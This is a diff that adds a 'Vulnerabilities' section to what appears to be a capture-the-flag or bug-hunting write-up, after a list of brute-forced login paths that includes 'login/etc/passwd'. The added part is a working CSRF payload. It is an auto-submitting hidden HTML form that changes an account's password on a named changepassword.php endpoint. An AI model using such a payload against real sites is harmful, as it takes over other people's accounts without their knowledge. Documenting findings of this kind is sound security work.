@@ -41,3 +41,21 @@ __raft-medium-directories_long.txt__
 - login/process.php
 - login/new-password.php
 - login/etc/passwd
+
+### Vulnerabilities 
+
+#### CSRF (0 Click Account Takeover)
+```html
+<html>
+  <body>
+    <form action="https://thc.cybersapiens.in/login/changepassword.php" method="POST">
+      <input type="hidden" name="email" value="JaswanthSunkara&#64;protonmail&#46;com" />
+      <input type="hidden" name="password" value="password" />
+      <input type="hidden" name="submit" value="" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
